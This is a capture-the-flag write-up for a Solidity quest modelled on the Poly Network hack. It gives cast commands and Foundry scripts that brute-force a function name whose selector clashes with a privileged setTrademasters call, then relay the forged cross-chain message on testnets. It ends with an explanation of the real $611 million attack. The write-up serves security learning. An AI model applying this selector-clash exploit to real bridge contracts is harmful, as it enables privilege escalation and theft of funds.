---
title: Poly Network
weight: 1
type: docs
---

- Link: https://nodeguardians.io/dev-hub/quests/poly-rekt</br>
- About: ctf</br>
- Author: Julien</br>
- Difficulty: 🗡🗡🗡🗡</br>
- Language: Solidity</br>
- Skill Cat: Security</br>

---

![Untitled](Poly%20Network%20Rekt%20b9b5dc8e661043d186f21308cc502756/Untitled.png)

First here the the boat address on Goerli (the target contract we have to interact with):

```solidity
cast call $TRADING_BOAT_GOERLI --rpc-url $RPC_URL_GOERLI "tradingData()(address)"

> 0xFDDa11C6504db2Cf760F3cb53253D88cF8A5a593
```

Now we can try to interact with the bridge contract on Fuji chain:

```solidity
cast send $TRADING_BOAT_FUJI  --private-key $PRIVATE_KEY --rpc-url $RPC_URL_FUJI "sendShipment(string,bytes32[],uint64,address)(bytes32)" "setTrademasters" [0x000000000000000000000000122C0492CEa0241cDfD7A11469e3434D24889Cc6] 0x5 $TRADING_DATA_GOERLI
```

output:

```solidity
0x97bc653aac2c7b476cefe65e9df32d34caf31f670e4f36a441000963f8df3a37
```

Now we can call the offchain trademaster to generate a signature:

![Untitled](Poly%20Network%20Rekt%20b9b5dc8e661043d186f21308cc502756/Untitled%201.png)

```solidity
Signature: 0x265d347b6819c4aa0de6f96f9874b9e78a1b2ad38d16068196ed532eb4d9f96c063a6779057b5cef1ecfb3752a4789bfae1e53cf073adef07ba928cf01a38c401c
```

Let’s create a script to automate the process:

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "forge-std/console.sol";

import {TradingBoat} from '../contracts_/TradingBoat.sol';

contract POC is Script {
    function run() external {

        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        address PUBLIC_KEY = vm.envAddress("PUBLIC_KEY");
        address TRADING_BOAT_GOERLI = vm.envAddress("TRADING_BOAT_GOERLI");
        address TRADING_DATA_GOERLI = vm.envAddress("TRADING_DATA_GOERLI");

        vm.startBroadcast(deployerPrivateKey);

        TradingBoat boat = TradingBoat(TRADING_BOAT_GOERLI);
        bytes32[] memory params = new bytes32[](1);
        params[0] = 0x000000000000000000000000122C0492CEa0241cDfD7A11469e3434D24889Cc6;
        bytes memory signature = hex"265d347b6819c4aa0de6f96f9874b9e78a1b2ad38d16068196ed532eb4d9f96c063a6779057b5cef1ecfb3752a4789bfae1e53cf073adef07ba928cf01a38c401c";
        boat.relayShipment("setTrademasters", params, 43113, PUBLIC_KEY, TRADING_DATA_GOERLI, signature);

        vm.stopBroadcast();
    }
}
```

Now we can relay the message on the goerli chain using the following script:

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "forge-std/console.sol";

import {TradingBoat} from '../contracts_/TradingBoat.sol';

contract POC is Script {
    function run() external {

        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        address PUBLIC_KEY = vm.envAddress("PUBLIC_KEY");
        address TRADING_BOAT_GOERLI = vm.envAddress("TRADING_BOAT_GOERLI");
        address TRADING_DATA_GOERLI = vm.envAddress("TRADING_DATA_GOERLI");

        vm.startBroadcast(deployerPrivateKey);

        TradingBoat boat = TradingBoat(TRADING_BOAT_GOERLI);
        bytes32[] memory params = new bytes32[](1);
        params[0] = 0x000000000000000000000000122C0492CEa0241cDfD7A11469e3434D24889Cc6;
        bytes memory signature = hex"265d347b6819c4aa0de6f96f9874b9e78a1b2ad38d16068196ed532eb4d9f96c063a6779057b5cef1ecfb3752a4789bfae1e53cf073adef07ba928cf01a38c401c";
        boat.relayShipment("setTrademasters", params, 43113, PUBLIC_KEY, TRADING_DATA_GOERLI, signature);

        vm.stopBroadcast();
    }
}
```

without a surprise the contract revert :

![Untitled](Poly%20Network%20Rekt%20b9b5dc8e661043d186f21308cc502756/Untitled%202.png)

This is because the relay function add some params (bytes32[],uint64,address) that we don’t need and that change the function selector resulting in calling the wrong method on the target contract:

![Untitled](Poly%20Network%20Rekt%20b9b5dc8e661043d186f21308cc502756/Untitled%203.png)

We can see on the error message above that we call the selector `0x3b2e7145` whereas we were expecting to call `0xef51774d` :

![Untitled](Poly%20Network%20Rekt%20b9b5dc8e661043d186f21308cc502756/Untitled%204.png)

Now we know that it’s pretty much straight forward what we have to do: brutforce the *method params so that `abi.ecodePacked(\_*method, (bytes32[], uint64, address)`result in the`0xef51774d` selector.

In order to do that I installed the following program that seems to do the job:

[https://github.com/botdad/power-clash](https://github.com/botdad/power-clash)

```bash
> docker run --rm power-clash -a bytes32[],uint64,address -s ef51774d -p setTrademasters
> Attempting to find setTrademasters******(bytes32[],uint64,address) match for 0xef51774d in 19770609664 max permutations
> Calculating 6277782.5 permutations per second
> Found match in 902.78942008s
> setTrademastersLMuGgO(bytes32[],uint64,address) hashes to 0xef51774d
```

and Bingo! we have it : `setTrademastersLMuGgO(bytes32[],uint64,address) hashes to 0xef51774d`

Now we can do the say process as before but using the new function name.

Here is the signature we got:

```bash
Signature: 0xeb8f7dc8da0fce482b52e20d85dc0f602c2932acea3170e3f4cea0a752855545505ac6ff2587c7d4d43b4936361832c4fd54c7a2a75d3f63efd23190f735f7771c
```

fuji.s.sol

```bash
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "forge-std/console.sol";

import {TradingBoat} from '../contracts_/TradingBoat.sol';

contract POC is Script {
    function run() external {

        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        address TRADING_BOAT_FUJI = vm.envAddress("TRADING_BOAT_FUJI");
        address TRADING_DATA_GOERLI = vm.envAddress("TRADING_DATA_GOERLI");

        vm.startBroadcast(deployerPrivateKey);

        TradingBoat boat = TradingBoat(TRADING_BOAT_FUJI);
        bytes32[] memory params = new bytes32[](1);
        params[0] = 0x000000000000000000000000122C0492CEa0241cDfD7A11469e3434D24889Cc6;
        bytes32 bridgeHash = boat.sendShipment("setTrademastersLMuGgO", params, 5, TRADING_DATA_GOERLI);
        console.logBytes32(bridgeHash);

        vm.stopBroadcast();
    }
}
```

goerli.s.sol

```bash
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "forge-std/console.sol";

import {TradingBoat} from '../contracts_/TradingBoat.sol';

contract POC is Script {
    function run() external {

        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        address PUBLIC_KEY = vm.envAddress("PUBLIC_KEY");
        address TRADING_BOAT_GOERLI = vm.envAddress("TRADING_BOAT_GOERLI");
        address TRADING_DATA_GOERLI = vm.envAddress("TRADING_DATA_GOERLI");

        vm.startBroadcast(deployerPrivateKey);

        TradingBoat boat = TradingBoat(TRADING_BOAT_GOERLI);
        bytes32[] memory params = new bytes32[](1);
        params[0] = 0x000000000000000000000000122C0492CEa0241cDfD7A11469e3434D24889Cc6;
        bytes memory signature = hex"eb8f7dc8da0fce482b52e20d85dc0f602c2932acea3170e3f4cea0a752855545505ac6ff2587c7d4d43b4936361832c4fd54c7a2a75d3f63efd23190f735f7771c";
        boat.relayShipment("setTrademastersLMuGgO", params, 43113, PUBLIC_KEY, TRADING_DATA_GOERLI, signature);

        vm.stopBroadcast();
    }
}
```

## **Poly Network**

Poly Network is a cross-chain protocol that facilitates cross-chain interaction between otherwise disconnected blockchains.

Poly Network is more advanced than King Baku's network. For instance, it uses merkle roots to batch cross-chain transactions, and a multi-signature scheme to improve decentralization.

However similar to our `TradingBoat` contracts, Poly Network partitions its cross-chain contracts into 2 entities:

1. `EthCrossChainManager` which handles the cross-chain verification and execution logic.

2. `EthCrossChainData` which manages important information regarding cross-chain trademasters and calls.

The partition allows Poly Network to upgrade `EthCrossChainManager` via proxy, while asserting `EthCrossChainData` as immutable.

## **Privilege Escalation Attack**

The attack on `TradingBoat` and Poly Network is enabled by the same two underlying reasons.

- The manager contract (`TradingBoat`/`EthCrossChainManager`) has access to some privileged external function (`setTrademasters()`/`putCurEpochConPubKeyBytes()`).
- The manager contract can call any function in any contract via selector clashing.

Consequently, a malicious attack can search for a selector clash that forces the manager contract to call the privileged external function, and invoke unexpected effects.

Poly Network has lost $611 million to this form of privilege escalation attack. Fortunately, the hacker has since return the stolen funds for a bug bounty reward.
